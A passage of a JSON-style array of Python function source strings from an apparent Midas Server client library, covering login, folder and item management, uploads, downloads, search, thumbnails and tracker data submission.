            "def _find_resource_id_from_path(path):\n    \"\"\"\n    Get a folder id from a path on the server.\n\n    Warning: This is NOT efficient at all.\n\n    The schema for this path is:\n    path := \"/users/<name>/\" | \"/communities/<name>\" , {<subfolder>/}\n    name := <firstname> , \"_\" , <lastname>\n\n    :param path: The virtual path on the server.\n    :type path: string\n    :returns: a tuple indicating True or False about whether the resource is an\n        item and id of the resource i.e. (True, item_id) or (False, folder_id)\n    :rtype: (bool, int | long)\n    \"\"\"\n    session.token = verify_credentials()\n\n    parsed_path = path.split('/')\n    if parsed_path[-1] == '':\n        parsed_path.pop()\n    if path.startswith('/users/'):\n        parsed_path.pop(0)  # remove '' before /\n        parsed_path.pop(0)  # remove 'users'\n        name = parsed_path.pop(0)  # remove '<firstname>_<lastname>'\n        firstname, lastname = name.split('_')\n        end = parsed_path.pop()\n        user = session.communicator.get_user_by_name(firstname, lastname)\n        leaf_folder_id = _descend_folder_for_id(parsed_path, user['folder_id'])\n        return _search_folder_for_item_or_folder(end, leaf_folder_id)\n    elif path.startswith('/communities/'):\n        print(parsed_path)\n        parsed_path.pop(0)  # remove '' before /\n        parsed_path.pop(0)  # remove 'communities'\n        community_name = parsed_path.pop(0)  # remove '<community>'\n        end = parsed_path.pop()\n        community = session.communicator.get_community_by_name(community_name)\n        leaf_folder_id = _descend_folder_for_id(parsed_path,\n                                                community['folder_id'])\n        return _search_folder_for_item_or_folder(end, leaf_folder_id)\n    else:\n        return False, -1"
        ],
        [
            "def _download_folder_recursive(folder_id, path='.'):\n    \"\"\"\n    Download a folder to the specified path along with any children.\n\n    :param folder_id: The id of the target folder\n    :type folder_id: int | long\n    :param path: (optional) the location to download the folder\n    :type path: string\n    \"\"\"\n    session.token = verify_credentials()\n\n    cur_folder = session.communicator.folder_get(session.token, folder_id)\n    # Replace any '/' in the folder name.\n    folder_path = os.path.join(path, cur_folder['name'].replace('/', '_'))\n    print('Creating folder at {0}'.format(folder_path))\n    try:\n        os.mkdir(folder_path)\n    except OSError as e:\n        if e.errno == errno.EEXIST and session.allow_existing_download_paths:\n            pass\n        else:\n            raise\n    cur_children = session.communicator.folder_children(\n        session.token, folder_id)\n    for item in cur_children['items']:\n        _download_item(item['item_id'], folder_path, item=item)\n    for folder in cur_children['folders']:\n        _download_folder_recursive(folder['folder_id'], folder_path)\n    for callback in session.folder_download_callbacks:\n        callback(session.communicator, session.token, cur_folder, folder_path)"
        ],
        [
            "def _download_item(item_id, path='.', item=None):\n    \"\"\"\n    Download the requested item to the specified path.\n\n    :param item_id: The id of the item to be downloaded\n    :type item_id: int | long\n    :param path: (optional) the location to download the item\n    :type path: string\n    :param item: The dict of item info\n    :type item: dict | None\n    \"\"\"\n    session.token = verify_credentials()\n\n    filename, content_iter = session.communicator.download_item(\n        item_id, session.token)\n    item_path = os.path.join(path, filename)\n    print('Creating file at {0}'.format(item_path))\n    out_file = open(item_path, 'wb')\n    for block in content_iter:\n        out_file.write(block)\n    out_file.close()\n    for callback in session.item_download_callbacks:\n        if not item:\n            item = session.communicator.item_get(session.token, item_id)\n        callback(session.communicator, session.token, item, item_path)"
        ],
        [
            "def download(server_path, local_path='.'):\n    \"\"\"\n    Recursively download a file or item from the Midas Server instance.\n\n    :param server_path: The location on the server to find the resource to\n        download\n    :type server_path: string\n    :param local_path: The location on the client to store the downloaded data\n    :type local_path: string\n    \"\"\"\n    session.token = verify_credentials()\n\n    is_item, resource_id = _find_resource_id_from_path(server_path)\n    if resource_id == -1:\n        print('Unable to locate {0}'.format(server_path))\n    else:\n        if is_item:\n            _download_item(resource_id, local_path)\n        else:\n            _download_folder_recursive(resource_id, local_path)"
        ],
        [
            "def login_with_api_key(self, email, api_key, application='Default'):\n        \"\"\"\n        Login and get a token. If you do not specify a specific application,\n        'Default' will be used.\n\n        :param email: Email address of the user\n        :type email: string\n        :param api_key: API key assigned to the user\n        :type api_key: string\n        :param application: (optional) Application designated for this API key\n        :type application: string\n        :returns: Token to be used for interaction with the API until\n            expiration\n        :rtype: string\n        \"\"\"\n        parameters = dict()\n        parameters['email'] = BaseDriver.email = email  # Cache email\n        parameters['apikey'] = BaseDriver.apikey = api_key  # Cache API key\n        parameters['appname'] = application\n        response = self.request('midas.login', parameters)\n        if 'token' in response:  # normal case\n            return response['token']\n        if 'mfa_token_id':  # case with multi-factor authentication\n            return response['mfa_token_id']"
        ],
        [
            "def list_user_folders(self, token):\n        \"\"\"\n        List the folders in the users home area.\n\n        :param token: A valid token for the user in question.\n        :type token: string\n        :returns: List of dictionaries containing folder information.\n        :rtype: list[dict]\n        \"\"\"\n        parameters = dict()\n        parameters['token'] = token\n        response = self.request('midas.user.folders', parameters)\n        return response"
        ],
        [
            "def get_default_api_key(self, email, password):\n        \"\"\"\n        Get the default API key for a user.\n\n        :param email: The email of the user.\n        :type email: string\n        :param password: The user's password.\n        :type password: string\n        :returns: API key to confirm that it was fetched successfully.\n        :rtype: string\n        \"\"\"\n        parameters = dict()\n        parameters['email'] = email\n        parameters['password'] = password\n        response = self.request('midas.user.apikey.default', parameters)\n        return response['apikey']"
        ],
        [
            "def list_users(self, limit=20):\n        \"\"\"\n        List the public users in the system.\n\n        :param limit: (optional) The number of users to fetch.\n        :type limit: int | long\n        :returns: The list of users.\n        :rtype: list[dict]\n        \"\"\"\n        parameters = dict()\n        parameters['limit'] = limit\n        response = self.request('midas.user.list', parameters)\n        return response"
        ],
        [
            "def get_user_by_email(self, email):\n        \"\"\"\n        Get a user by the email of that user.\n\n        :param email: The email of the desired user.\n        :type email: string\n        :returns: The user requested.\n        :rtype: dict\n        \"\"\"\n        parameters = dict()\n        parameters['email'] = email\n        response = self.request('midas.user.get', parameters)\n        return response"
        ],
        [
            "def create_community(self, token, name, **kwargs):\n        \"\"\"\n        Create a new community or update an existing one using the uuid.\n\n        :param token: A valid token for the user in question.\n        :type token: string\n        :param name: The community name.\n        :type name: string\n        :param description: (optional) The community description.\n        :type description: string\n        :param uuid: (optional) uuid of the community. If none is passed, will\n            generate one.\n        :type uuid: string\n        :param privacy: (optional) Default 'Public', possible values\n            [Public|Private].\n        :type privacy: string\n        :param can_join: (optional) Default 'Everyone', possible values\n            [Everyone|Invitation].\n        :type can_join: string\n        :returns: The community dao that was created.\n        :rtype: dict\n        \"\"\"\n        parameters = dict()\n        parameters['token'] = token\n        parameters['name'] = name\n        optional_keys = ['description', 'uuid', 'privacy', 'can_join']\n        for key in optional_keys:\n            if key in kwargs:\n                if key == 'can_join':\n                    parameters['canjoin'] = kwargs[key]\n                    continue\n                parameters[key] = kwargs[key]\n        response = self.request('midas.community.create', parameters)\n        return response"
        ],
        [
            "def get_community_by_name(self, name, token=None):\n        \"\"\"\n        Get a community based on its name.\n\n        :param name: The name of the target community.\n        :type name: string\n        :param token: (optional) A valid token for the user in question.\n        :type token: None | string\n        :returns: The requested community.\n        :rtype: dict\n        \"\"\"\n        parameters = dict()\n        parameters['name'] = name\n        if token:\n            parameters['token'] = token\n        response = self.request('midas.community.get', parameters)\n        return response"
        ],
        [
            "def get_community_by_id(self, community_id, token=None):\n        \"\"\"\n        Get a community based on its id.\n\n        :param community_id: The id of the target community.\n        :type community_id: int | long\n        :param token: (optional) A valid token for the user in question.\n        :type token: None | string\n        :returns: The requested community.\n        :rtype: dict\n        \"\"\"\n        parameters = dict()\n        parameters['id'] = community_id\n        if token:\n            parameters['token'] = token\n        response = self.request('midas.community.get', parameters)\n        return response"
        ],
        [
            "def get_community_children(self, community_id, token=None):\n        \"\"\"\n        Get the non-recursive children of the passed in community_id.\n\n        :param community_id: The id of the requested community.\n        :type community_id: int | long\n        :param token: (optional) A valid token for the user in question.\n        :type token: None | string\n        :returns: List of the folders in the community.\n        :rtype: dict[string, list]\n        \"\"\"\n        parameters = dict()\n        parameters['id'] = community_id\n        if token:\n            parameters['token'] = token\n        response = self.request('midas.community.children', parameters)\n        return response"
        ],
        [
            "def list_communities(self, token=None):\n        \"\"\"\n        List all communities visible to a user.\n\n        :param token: (optional) A valid token for the user in question.\n        :type token: None | string\n        :returns: The list of communities.\n        :rtype: list[dict]\n        \"\"\"\n        parameters = dict()\n        if token:\n            parameters['token'] = token\n        response = self.request('midas.community.list', parameters)\n        return response"
        ],
        [
            "def folder_get(self, token, folder_id):\n        \"\"\"\n        Get the attributes of the specified folder.\n\n        :param token: A valid token for the user in question.\n        :type token: string\n        :param folder_id: The id of the requested folder.\n        :type folder_id: int | long\n        :returns: Dictionary of the folder attributes.\n        :rtype: dict\n        \"\"\"\n        parameters = dict()\n        parameters['token'] = token\n        parameters['id'] = folder_id\n        response = self.request('midas.folder.get', parameters)\n        return response"
        ],
        [
            "def folder_children(self, token, folder_id):\n        \"\"\"\n        Get the non-recursive children of the passed in folder_id.\n\n        :param token: A valid token for the user in question.\n        :type token: string\n        :param folder_id: The id of the requested folder.\n        :type folder_id: int | long\n        :returns: Dictionary of two lists: 'folders' and 'items'.\n        :rtype: dict[string, list]\n        \"\"\"\n        parameters = dict()\n        parameters['token'] = token\n        parameters['id'] = folder_id\n        response = self.request('midas.folder.children', parameters)\n        return response"
        ],
        [
            "def delete_folder(self, token, folder_id):\n        \"\"\"\n        Delete the folder with the passed in folder_id.\n\n        :param token: A valid token for the user in question.\n        :type token: string\n        :param folder_id: The id of the folder to be deleted.\n        :type folder_id: int | long\n        :returns: None.\n        :rtype: None\n        \"\"\"\n        parameters = dict()\n        parameters['token'] = token\n        parameters['id'] = folder_id\n        response = self.request('midas.folder.delete', parameters)\n        return response"
        ],
        [
            "def move_folder(self, token, folder_id, dest_folder_id):\n        \"\"\"\n        Move a folder to the destination folder.\n\n        :param token: A valid token for the user in question.\n        :type token: string\n        :param folder_id: The id of the folder to be moved.\n        :type folder_id: int | long\n        :param dest_folder_id: The id of destination (new parent) folder.\n        :type dest_folder_id: int | long\n        :returns: Dictionary containing the details of the moved folder.\n        :rtype: dict\n        \"\"\"\n        parameters = dict()\n        parameters['token'] = token\n        parameters['id'] = folder_id\n        parameters['dstfolderid'] = dest_folder_id\n        response = self.request('midas.folder.move', parameters)\n        return response"
        ],
        [
            "def create_item(self, token, name, parent_id, **kwargs):\n        \"\"\"\n        Create an item to the server.\n\n        :param token: A valid token for the user in question.\n        :type token: string\n        :param name: The name of the item to be created.\n        :type name: string\n        :param parent_id: The id of the destination folder.\n        :type parent_id: int | long\n        :param description: (optional) The description text of the item.\n        :type description: string\n        :param uuid: (optional) The UUID for the item. It will be generated if\n            not given.\n        :type uuid: string\n        :param privacy: (optional) The privacy state of the item\n            ('Public' or 'Private').\n        :type privacy: string\n        :returns: Dictionary containing the details of the created item.\n        :rtype: dict\n        \"\"\"\n        parameters = dict()\n        parameters['token'] = token\n        parameters['name'] = name\n        parameters['parentid'] = parent_id\n        optional_keys = ['description', 'uuid', 'privacy']\n        for key in optional_keys:\n            if key in kwargs:\n                parameters[key] = kwargs[key]\n        response = self.request('midas.item.create', parameters)\n        return response"
        ],
        [
            "def item_get(self, token, item_id):\n        \"\"\"\n        Get the attributes of the specified item.\n\n        :param token: A valid token for the user in question.\n        :type token: string\n        :param item_id: The id of the requested item.\n        :type item_id: int | string\n        :returns: Dictionary of the item attributes.\n        :rtype: dict\n        \"\"\"\n        parameters = dict()\n        parameters['token'] = token\n        parameters['id'] = item_id\n        response = self.request('midas.item.get', parameters)\n        return response"
        ],
        [
            "def download_item(self, item_id, token=None, revision=None):\n        \"\"\"\n        Download an item to disk.\n\n        :param item_id: The id of the item to be downloaded.\n        :type item_id: int | long\n        :param token: (optional) The authentication token of the user\n            requesting the download.\n        :type token: None | string\n        :param revision: (optional) The revision of the item to download, this\n            defaults to HEAD.\n        :type revision: None | int | long\n        :returns: A tuple of the filename and the content iterator.\n        :rtype: (string, unknown)\n        \"\"\"\n        parameters = dict()\n        parameters['id'] = item_id\n        if token:\n            parameters['token'] = token\n        if revision:\n            parameters['revision'] = revision\n        method_url = self.full_url + 'midas.item.download'\n        request = requests.get(method_url,\n                               params=parameters,\n                               stream=True,\n                               verify=self._verify_ssl_certificate)\n        filename = request.headers['content-disposition'][21:].strip('\"')\n        return filename, request.iter_content(chunk_size=10 * 1024)"
        ],
        [
            "def delete_item(self, token, item_id):\n        \"\"\"\n        Delete the item with the passed in item_id.\n\n        :param token: A valid token for the user in question.\n        :type token: string\n        :param item_id: The id of the item to be deleted.\n        :type item_id: int | long\n        :returns: None.\n        :rtype: None\n        \"\"\"\n        parameters = dict()\n        parameters['token'] = token\n        parameters['id'] = item_id\n        response = self.request('midas.item.delete', parameters)\n        return response"
        ],
        [
            "def get_item_metadata(self, item_id, token=None, revision=None):\n        \"\"\"\n        Get the metadata associated with an item.\n\n        :param item_id: The id of the item for which metadata will be returned\n        :type item_id: int | long\n        :param token: (optional) A valid token for the user in question.\n        :type token: None | string\n        :param revision: (optional) Revision of the item. Defaults to latest\n            revision.\n        :type revision: int | long\n        :returns: List of dictionaries containing item metadata.\n        :rtype: list[dict]\n        \"\"\"\n        parameters = dict()\n        parameters['id'] = item_id\n        if token:\n            parameters['token'] = token\n        if revision:\n            parameters['revision'] = revision\n        response = self.request('midas.item.getmetadata', parameters)\n        return response"
        ],
        [
            "def set_item_metadata(self, token, item_id, element, value,\n                          qualifier=None):\n        \"\"\"\n        Set the metadata associated with an item.\n\n        :param token: A valid token for the user in question.\n        :type token: string\n        :param item_id: The id of the item for which metadata will be set.\n        :type item_id: int | long\n        :param element: The metadata element name.\n        :type element: string\n        :param value: The metadata value for the field.\n        :type value: string\n        :param qualifier: (optional) The metadata qualifier. Defaults to empty\n            string.\n        :type qualifier: None | string\n        :returns: None.\n        :rtype: None\n        \"\"\"\n        parameters = dict()\n        parameters['token'] = token\n        parameters['itemId'] = item_id\n        parameters['element'] = element\n        parameters['value'] = value\n        if qualifier:\n            parameters['qualifier'] = qualifier\n        response = self.request('midas.item.setmetadata', parameters)\n        return response"
        ],
        [
            "def share_item(self, token, item_id, dest_folder_id):\n        \"\"\"\n        Share an item to the destination folder.\n\n        :param token: A valid token for the user in question.\n        :type token: string\n        :param item_id: The id of the item to be shared.\n        :type item_id: int | long\n        :param dest_folder_id: The id of destination folder where the item is\n            shared to.\n        :type dest_folder_id: int | long\n        :returns: Dictionary containing the details of the shared item.\n        :rtype: dict\n        \"\"\"\n        parameters = dict()\n        parameters['token'] = token\n        parameters['id'] = item_id\n        parameters['dstfolderid'] = dest_folder_id\n        response = self.request('midas.item.share', parameters)\n        return response"
        ],
        [
            "def move_item(self, token, item_id, src_folder_id, dest_folder_id):\n        \"\"\"\n        Move an item from the source folder to the destination folder.\n\n        :param token: A valid token for the user in question.\n        :type token: string\n        :param item_id: The id of the item to be moved\n        :type item_id: int | long\n        :param src_folder_id: The id of source folder where the item is located\n        :type src_folder_id: int | long\n        :param dest_folder_id: The id of destination folder where the item is\n            moved to\n        :type dest_folder_id: int | long\n        :returns: Dictionary containing the details of the moved item\n        :rtype: dict\n        \"\"\"\n        parameters = dict()\n        parameters['token'] = token\n        parameters['id'] = item_id\n        parameters['srcfolderid'] = src_folder_id\n        parameters['dstfolderid'] = dest_folder_id\n        response = self.request('midas.item.move', parameters)\n        return response"
        ],
        [
            "def search_item_by_name(self, name, token=None):\n        \"\"\"\n        Return all items.\n\n        :param name: The name of the item to search by.\n        :type name: string\n        :param token: (optional) A valid token for the user in question.\n        :type token: None | string\n        :returns: A list of all items with the given name.\n        :rtype: list[dict]\n        \"\"\"\n        parameters = dict()\n        parameters['name'] = name\n        if token:\n            parameters['token'] = token\n        response = self.request('midas.item.searchbyname', parameters)\n        return response['items']"
        ],
        [
            "def search_item_by_name_and_folder(self, name, folder_id, token=None):\n        \"\"\"\n        Return all items with a given name and parent folder id.\n\n        :param name: The name of the item to search by.\n        :type name: string\n        :param folder_id: The id of the parent folder to search by.\n        :type folder_id: int | long\n        :param token: (optional) A valid token for the user in question.\n        :type token: None | string\n        :returns: A list of all items with the given name and parent folder id.\n        :rtype: list[dict]\n        \"\"\"\n        parameters = dict()\n        parameters['name'] = name\n        parameters['folderId'] = folder_id\n        if token:\n            parameters['token'] = token\n        response = self.request('midas.item.searchbynameandfolder', parameters)\n        return response['items']"
        ],
        [
            "def search_item_by_name_and_folder_name(self, name, folder_name,\n                                            token=None):\n        \"\"\"\n        Return all items with a given name and parent folder name.\n\n        :param name: The name of the item to search by.\n        :type name: string\n        :param folder_name: The name of the parent folder to search by.\n        :type folder_name: string\n        :param token: (optional) A valid token for the user in question.\n        :type token: None | string\n        :returns: A list of all items with the given name and parent folder\n            name.\n        :rtype: list[dict]\n        \"\"\"\n        parameters = dict()\n        parameters['name'] = name\n        parameters['folderName'] = folder_name\n        if token:\n            parameters['token'] = token\n        response = self.request('midas.item.searchbynameandfoldername',\n                                parameters)\n        return response['items']"
        ],
        [
            "def create_link(self, token, folder_id, url, **kwargs):\n        \"\"\"\n        Create a link bitstream.\n\n        :param token: A valid token for the user in question.\n        :type token: string\n        :param folder_id: The id of the folder in which to create a new item\n            that will contain the link. The new item will have the same name as\n            the URL unless an item name is supplied.\n        :type folder_id: int | long\n        :param url: The URL of the link you will create, will be used as the\n            name of the bitstream and of the item unless an item name is\n            supplied.\n        :type url: string\n        :param item_name: (optional)  The name of the newly created item, if\n            not supplied, the item will have the same name as the URL.\n        :type item_name: string\n        :param length: (optional) The length in bytes of the file to which the\n            link points.\n        :type length: int | long\n        :param checksum: (optional) The MD5 checksum of the file to which the\n            link points.\n        :type checksum: string\n        :returns: The item information of the item created.\n        :rtype: dict\n        \"\"\"\n        parameters = dict()\n        parameters['token'] = token\n        parameters['folderid'] = folder_id\n        parameters['url'] = url\n        optional_keys = ['item_name', 'length', 'checksum']\n        for key in optional_keys:\n            if key in kwargs:\n                if key == 'item_name':\n                    parameters['itemname'] = kwargs[key]\n                    continue\n                parameters[key] = kwargs[key]\n        response = self.request('midas.link.create', parameters)\n        return response"
        ],
        [
            "def generate_upload_token(self, token, item_id, filename, checksum=None):\n        \"\"\"\n        Generate a token to use for upload.\n\n        Midas Server uses a individual token for each upload. The token\n        corresponds to the file specified and that file only. Passing the MD5\n        checksum allows the server to determine if the file is already in the\n        asset store.\n\n        If :param:`checksum` is passed and the token returned is blank, the\n        server already has this file and there is no need to follow this\n        call with a call to `perform_upload`, as the passed in file will have\n        been added as a bitstream to the item's latest revision, creating a\n        new revision if one doesn't exist.\n\n        :param token: A valid token for the user in question.\n        :type token: string\n        :param item_id: The id of the item in which to upload the file as a\n            bitstream.\n        :type item_id: int | long\n        :param filename: The name of the file to generate the upload token for.\n        :type filename: string\n        :param checksum: (optional) The checksum of the file to upload.\n        :type checksum: None | string\n        :returns: String of the upload token.\n        :rtype: string\n        \"\"\"\n        parameters = dict()\n        parameters['token'] = token\n        parameters['itemid'] = item_id\n        parameters['filename'] = filename\n        if checksum is not None:\n            parameters['checksum'] = checksum\n        response = self.request('midas.upload.generatetoken', parameters)\n        return response['token']"
        ],
        [
            "def perform_upload(self, upload_token, filename, **kwargs):\n        \"\"\"\n        Upload a file into a given item (or just to the public folder if the\n        item is not specified.\n\n        :param upload_token: The upload token (returned by\n            generate_upload_token)\n        :type upload_token: string\n        :param filename: The upload filename. Also used as the path to the\n            file, if 'filepath' is not set.\n        :type filename: string\n        :param mode: (optional) Stream or multipart. Default is stream.\n        :type mode: string\n        :param folder_id: (optional) The id of the folder to upload into.\n        :type folder_id: int | long\n        :param item_id: (optional) If set, will append item ``bitstreams`` to\n            the latest revision (or the one set using :param:`revision` ) of\n            the existing item.\n        :type item_id: int | long\n        :param revision: (optional) If set, will add a new file into an\n            existing revision. Set this to 'head' to add to the most recent\n            revision.\n        :type revision: string | int | long\n        :param filepath: (optional) The path to the file.\n        :type filepath: string\n        :param create_additional_revision: (optional) If set, will create a\n            new revision in the existing item.\n        :type create_additional_revision: bool\n        :returns: Dictionary containing the details of the item created or\n            changed.\n        :rtype: dict\n        \"\"\"\n        parameters = dict()\n        parameters['uploadtoken'] = upload_token\n        parameters['filename'] = filename\n\n        try:\n            create_additional_revision = kwargs['create_additional_revision']\n        except KeyError:\n            create_additional_revision = False\n\n        if not create_additional_revision:\n            parameters['revision'] = 'head'\n        optional_keys = ['mode', 'folderid', 'item_id', 'itemid', 'revision']\n        for key in optional_keys:\n            if key in kwargs:\n                if key == 'item_id':\n                    parameters['itemid'] = kwargs[key]\n                    continue\n                if key == 'folder_id':\n                    parameters['folderid'] = kwargs[key]\n                    continue\n                parameters[key] = kwargs[key]\n\n        # We may want a different name than path\n        file_payload = open(kwargs.get('filepath', filename), 'rb')\n        # Arcane getting of the file size using fstat. More details can be\n        # found in the python library docs\n        parameters['length'] = os.fstat(file_payload.fileno()).st_size\n\n        response = self.request('midas.upload.perform', parameters,\n                                file_payload)\n        return response"
        ],
        [
            "def search(self, search, token=None):\n        \"\"\"\n        Get the resources corresponding to a given query.\n\n        :param search: The search criterion.\n        :type search: string\n        :param token: (optional) The credentials to use when searching.\n        :type token: None | string\n        :returns: Dictionary containing the search result. Notable is the\n            dictionary item 'results', which is a list of item details.\n        :rtype: dict\n        \"\"\"\n        parameters = dict()\n        parameters['search'] = search\n        if token:\n            parameters['token'] = token\n        response = self.request('midas.resource.search', parameters)\n        return response"
        ],
        [
            "def add_condor_dag(self, token, batchmaketaskid, dagfilename,\n                       dagmanoutfilename):\n        \"\"\"\n        Add a Condor DAG to the given Batchmake task.\n\n        :param token: A valid token for the user in question.\n        :type token: string\n        :param batchmaketaskid: id of the Batchmake task for this DAG\n        :type batchmaketaskid: int | long\n        :param dagfilename: Filename of the DAG file\n        :type dagfilename: string\n        :param dagmanoutfilename: Filename of the DAG processing output\n        :type dagmanoutfilename: string\n        :returns: The created Condor DAG DAO\n        :rtype: dict\n        \"\"\"\n        parameters = dict()\n        parameters['token'] = token\n        parameters['batchmaketaskid'] = batchmaketaskid\n        parameters['dagfilename'] = dagfilename\n        parameters['outfilename'] = dagmanoutfilename\n        response = self.request('midas.batchmake.add.condor.dag', parameters)\n        return response"
        ],
        [
            "def add_condor_job(self, token, batchmaketaskid, jobdefinitionfilename,\n                       outputfilename, errorfilename, logfilename,\n                       postfilename):\n        \"\"\"\n        Add a Condor DAG job to the Condor DAG associated with this\n        Batchmake task\n\n        :param token: A valid token for the user in question.\n        :type token: string\n        :param batchmaketaskid: id of the Batchmake task for this DAG\n        :type batchmaketaskid: int | long\n        :param jobdefinitionfilename: Filename of the definition file for the\n            job\n        :type jobdefinitionfilename: string\n        :param outputfilename: Filename of the output file for the job\n        :type outputfilename: string\n        :param errorfilename: Filename of the error file for the job\n        :type errorfilename: string\n        :param logfilename: Filename of the log file for the job\n        :type logfilename: string\n        :param postfilename: Filename of the post script log file for the job\n        :type postfilename: string\n        :return: The created Condor job DAO.\n        :rtype: dict\n        \"\"\"\n        parameters = dict()\n        parameters['token'] = token\n        parameters['batchmaketaskid'] = batchmaketaskid\n        parameters['jobdefinitionfilename'] = jobdefinitionfilename\n        parameters['outputfilename'] = outputfilename\n        parameters['errorfilename'] = errorfilename\n        parameters['logfilename'] = logfilename\n        parameters['postfilename'] = postfilename\n        response = self.request('midas.batchmake.add.condor.job', parameters)\n        return response"
        ],
        [
            "def extract_dicommetadata(self, token, item_id):\n        \"\"\"\n        Extract DICOM metadata from the given item\n\n        :param token: A valid token for the user in question.\n        :type token: string\n        :param item_id: id of the item to be extracted\n        :type item_id: int | long\n        :return: the item revision DAO\n        :rtype: dict\n        \"\"\"\n        parameters = dict()\n        parameters['token'] = token\n        parameters['item'] = item_id\n        response = self.request('midas.dicomextractor.extract', parameters)\n        return response"
        ],
        [
            "def mfa_otp_login(self, temp_token, one_time_pass):\n        \"\"\"\n        Log in to get the real token using the temporary token and otp.\n\n        :param temp_token: The temporary token or id returned from normal login\n        :type temp_token: string\n        :param one_time_pass: The one-time pass to be sent to the underlying\n            multi-factor engine.\n        :type one_time_pass: string\n        :returns: A standard token for interacting with the web api.\n        :rtype: string\n        \"\"\"\n        parameters = dict()\n        parameters['mfaTokenId'] = temp_token\n        parameters['otp'] = one_time_pass\n        response = self.request('midas.mfa.otp.login', parameters)\n        return response['token']"
        ],
        [
            "def create_big_thumbnail(self, token, bitstream_id, item_id, width=575):\n        \"\"\"\n        Create a big thumbnail for the given bitstream with the given width.\n        It is used as the main image of the given item and shown in the item\n        view page.\n\n        :param token: A valid token for the user in question.\n        :type token: string\n        :param bitstream_id: The bitstream from which to create the thumbnail.\n        :type bitstream_id: int | long\n        :param item_id: The item on which to set the thumbnail.\n        :type item_id: int | long\n        :param width: (optional) The width in pixels to which to resize (aspect\n            ratio will be preserved). Defaults to 575.\n        :type width: int | long\n        :returns: The ItemthumbnailDao object that was created.\n        :rtype: dict\n        \"\"\"\n        parameters = dict()\n        parameters['token'] = token\n        parameters['bitstreamId'] = bitstream_id\n        parameters['itemId'] = item_id\n        parameters['width'] = width\n        response = self.request('midas.thumbnailcreator.create.big.thumbnail',\n                                parameters)\n        return response"
        ],
        [
            "def create_small_thumbnail(self, token, item_id):\n        \"\"\"\n        Create a 100x100 small thumbnail for the given item. It is used for\n        preview purpose and displayed in the 'preview' and 'thumbnails'\n        sidebar sections.\n\n        :param token: A valid token for the user in question.\n        :type token: string\n        :param item_id: The item on which to set the thumbnail.\n        :type item_id: int | long\n        :returns: The item object (with the new thumbnail id) and the path\n            where the newly created thumbnail is stored.\n        :rtype: dict\n        \"\"\"\n        parameters = dict()\n        parameters['token'] = token\n        parameters['itemId'] = item_id\n        response = self.request(\n            'midas.thumbnailcreator.create.small.thumbnail', parameters)\n        return response"
        ],
        [
            "def solr_advanced_search(self, query, token=None, limit=20):\n        \"\"\"\n        Search item metadata using Apache Solr.\n\n        :param query: The Apache Lucene search query.\n        :type query: string\n        :param token: (optional) A valid token for the user in question.\n        :type token: None | string\n        :param limit: (optional) The limit of the search.\n        :type limit: int | long\n        :returns: The list of items that match the search query.\n        :rtype: list[dict]\n        \"\"\"\n        parameters = dict()\n        parameters['query'] = query\n        parameters['limit'] = limit\n        if token:\n            parameters['token'] = token\n        response = self.request('midas.solr.search.advanced', parameters)\n        return response"
        ],
        [
            "def add_scalar_data(self, token, community_id, producer_display_name,\n                        metric_name, producer_revision, submit_time, value,\n                        **kwargs):\n        \"\"\"\n        Create a new scalar data point.\n\n        :param token: A valid token for the user in question.\n        :type token: string\n        :param community_id: The id of the community that owns the producer.\n        :type community_id: int | long\n        :param producer_display_name: The display name of the producer.\n        :type producer_display_name: string\n        :param metric_name: The metric name that identifies which trend this\n            point belongs to.\n        :type metric_name: string\n        :param producer_revision: The repository revision of the producer that\n            produced this value.\n        :type producer_revision: int | long | string\n        :param submit_time: The submit timestamp. Must be parsable with PHP\n            strtotime().\n        :type submit_time: string\n        :param value: The value of the scalar.\n        :type value: float\n        :param config_item_id: (optional) If this value pertains to a specific\n            configuration item, pass its id here.\n        :type config_item_id: int | long\n        :param test_dataset_id: (optional) If this value pertains to a\n            specific test dataset, pass its id here.\n        :type test_dataset_id: int | long\n        :param truth_dataset_id: (optional) If this value pertains to a\n            specific ground truth dataset, pass its id here.\n        :type truth_dataset_id: int | long\n        :param silent: (optional) If true, do not perform threshold-based email\n            notifications for this scalar.\n        :type silent: bool\n        :param unofficial: (optional) If true, creates an unofficial scalar\n            visible only to the user performing the submission.\n        :type unofficial: bool\n        :param build_results_url: (optional) A URL for linking to build results\n            for this submission.\n        :type build_results_url: string\n        :param branch: (optional) The branch name in the source repository for\n            this submission.\n        :type branch: string\n        :param submission_id: (optional) The id of the submission.\n        :type submission_id: int | long\n        :param submission_uuid: (optional) The uuid of the submission. If one\n            does not exist, it will be created.\n        :type submission_uuid: string\n        :type branch: string\n        :param params: (optional) Any key/value pairs that should be displayed\n            with this scalar result.\n        :type params: dict\n        :param extra_urls: (optional) Other URL's that should be displayed with\n            with this scalar result. Each element of the list should be a dict\n            with the following keys: label, text, href\n        :type extra_urls: list[dict]\n        :param unit: (optional) The unit of the scalar value.\n        :type unit: string\n        :param reproduction_command: (optional) The command to reproduce this\n            scalar.\n        :type reproduction_command: string\n        :returns: The scalar object that was created.\n        :rtype: dict\n        \"\"\"\n        parameters = dict()\n        parameters['token'] = token\n        parameters['communityId'] = community_id\n        parameters['producerDisplayName'] = producer_display_name\n        parameters['metricName'] = metric_name\n        parameters['producerRevision'] = producer_revision\n        parameters['submitTime'] = submit_time\n        parameters['value'] = value\n        optional_keys = [\n            'config_item_id', 'test_dataset_id', 'truth_dataset_id', 'silent',\n            'unofficial', 'build_results_url', 'branch', 'extra_urls',\n            'params', 'submission_id', 'submission_uuid', 'unit',\n            'reproduction_command'\n        ]\n        for key in optional_keys:\n            if key in kwargs:\n                if key == 'config_item_id':\n                    parameters['configItemId'] = kwargs[key]\n                elif key == 'test_dataset_id':\n                    parameters['testDatasetId'] = kwargs[key]\n                elif key == 'truth_dataset_id':\n                    parameters['truthDatasetId'] = kwargs[key]\n                elif key == 'build_results_url':\n                    parameters['buildResultsUrl'] = kwargs[key]\n                elif key == 'extra_urls':\n                    parameters['extraUrls'] = json.dumps(kwargs[key])\n                elif key == 'params':\n                    parameters[key] = json.dumps(kwargs[key])\n                elif key == 'silent':\n                    if kwargs[key]:\n                        parameters[key] = kwargs[key]\n                elif key == 'unofficial':\n                    if kwargs[key]:\n                        parameters[key] = kwargs[key]\n                elif key == 'submission_id':\n                    parameters['submissionId'] = kwargs[key]\n                elif key == 'submission_uuid':\n                    parameters['submissionUuid'] = kwargs[key]\n                elif key == 'unit':\n                    parameters['unit'] = kwargs[key]\n                elif key == 'reproduction_command':\n                    parameters['reproductionCommand'] = kwargs[key]\n                else:\n                    parameters[key] = kwargs[key]\n        response = self.request('midas.tracker.scalar.add', parameters)\n        return response"
        ],
        [
